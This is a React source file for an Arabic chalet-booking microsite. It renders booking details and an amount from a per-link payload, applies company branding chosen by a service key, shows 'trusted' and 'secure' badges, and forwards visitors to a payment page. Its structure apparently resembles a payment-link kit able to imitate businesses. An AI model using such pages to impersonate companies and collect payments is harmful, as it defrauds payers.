import React from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency } from "@/utils/countryData";
import { getPaymentData } from "@/utils/paymentData";
import SEOHead from "@/components/SEOHead";
import {
  Home,
  CheckCircle2,
  Shield,
  MapPin,
  Users,
  Calendar,
  DollarSign,
} from "lucide-react";

const ChaletMicrosite = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading } = useLink(id);
  
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (!link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground">الرجاء التحقق من الرابط</p>
        </div>
      </div>
    );
  }
  
  const payload = link.payload;
  const countryCode = link.country_code || payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);

  const paymentInfo = getPaymentData(link);
  const amount = paymentInfo.amount;
  
  const serviceKey = payload?.chalet_key || 'sa-abha-mountain';
  const serviceBranding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  const chaletTheme = {
    primary: serviceBranding.colors.primary,
    secondary: serviceBranding.colors.secondary,
    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
    bgLight: "#f0fdf4"
  };

  const handleProceedToPayment = () => {
    navigate(`/pay/${id}/recipient?company=${serviceKey}&currency=${countryData?.currency || 'SAR'}`);
  };

  return (
    <>
      <SEOHead
        title={`حجز شاليه - ${payload?.chalet_name || 'شاليه فاخر'}`}
        description={`احجز ${payload?.chalet_name || 'شاليه'} - تجربة استثنائية`}
        ogImage={serviceBranding.ogImage}
        company={serviceKey}
      />
      
      <div className="min-h-screen py-8" dir="rtl" style={{ background: `linear-gradient(to bottom, ${chaletTheme.bgLight}, white)` }}>
        <div className="container mx-auto px-4 max-w-2xl">
          <Card className="overflow-hidden shadow-2xl border-2" style={{ borderColor: `${chaletTheme.primary}30` }}>
            <div
              className="h-32 relative"
              style={{ background: chaletTheme.gradient }}
            >
              <div className="absolute inset-0 bg-black/10" />
              <div className="absolute inset-0 flex flex-col items-center justify-center text-white">
                <Home className="w-12 h-12 mb-2" />
                <h1 className="text-2xl font-bold">حجز شاليه</h1>
                <p className="text-sm opacity-90">تجربة استثنائية بانتظارك</p>
              </div>
            </div>

            <div className="p-6 space-y-6">
              <div className="flex items-center gap-2 justify-center">
                <Badge className="text-xs px-3 py-1" style={{ background: `${chaletTheme.primary}20`, color: chaletTheme.primary }}>
                  <CheckCircle2 className="w-3 h-3 ml-1" />
                  موثوق
                </Badge>
                <Badge className="text-xs px-3 py-1" style={{ background: `${chaletTheme.primary}20`, color: chaletTheme.primary }}>
                  <Shield className="w-3 h-3 ml-1" />
                  آمن
                </Badge>
              </div>

              <div className="space-y-4">
                <div className="p-5 rounded-xl" style={{ background: chaletTheme.bgLight }}>
                  <div className="space-y-3">
                    {payload?.chalet_name && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <Home className="w-4 h-4" />
                          اسم الشاليه:
                        </span>
                        <span className="font-bold text-base">{payload.chalet_name}</span>
                      </div>
                    )}

                    {payload?.city && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <MapPin className="w-4 h-4" />
                          المدينة:
                        </span>
                        <span className="font-semibold text-sm">{payload.city}</span>
                      </div>
                    )}
                    
                    {payload?.nights && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <Calendar className="w-4 h-4" />
                          عدد الليالي:
                        </span>
                        <span className="font-semibold text-sm">{payload.nights} ليلة</span>
                      </div>
                    )}

                    {payload?.guest_count && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <Users className="w-4 h-4" />
                          عدد الضيوف:
                        </span>
                        <span className="font-semibold text-sm">{payload.guest_count} ضيف</span>
                      </div>
                    )}
                    
                    <div className="flex items-center justify-between pt-3 border-t" style={{ borderColor: `${chaletTheme.primary}20` }}>
                      <span className="text-sm text-muted-foreground flex items-center gap-2">
                        <DollarSign className="w-4 h-4" />
                        المبلغ الإجمالي:
                      </span>
                      <span className="font-bold text-2xl" style={{ color: chaletTheme.primary }}>
                        {formatCurrency(amount, countryData?.currency || 'SAR')}
                      </span>
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-2 text-xs text-muted-foreground justify-center">
                  <Shield className="w-4 h-4" style={{ color: chaletTheme.primary }} />
                  <span>جميع المعاملات محمية بتشفير SSL</span>
                </div>

                <Button
                  onClick={handleProceedToPayment}
                  className="w-full py-7 text-lg font-bold shadow-xl hover:shadow-2xl transition-all text-white"
                  style={{ background: chaletTheme.gradient }}
                >
                  <Home className="w-5 h-5 ml-2" />
                  <span>إتمام الحجز والدفع</span>
                </Button>

                <div className="pt-4 border-t text-center space-y-2">
                  <p className="text-xs text-muted-foreground">
                    🏖️ استمتع بإقامة لا تُنسى في أفضل الشاليهات
                  </p>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </>
  );
};

export default ChaletMicrosite;
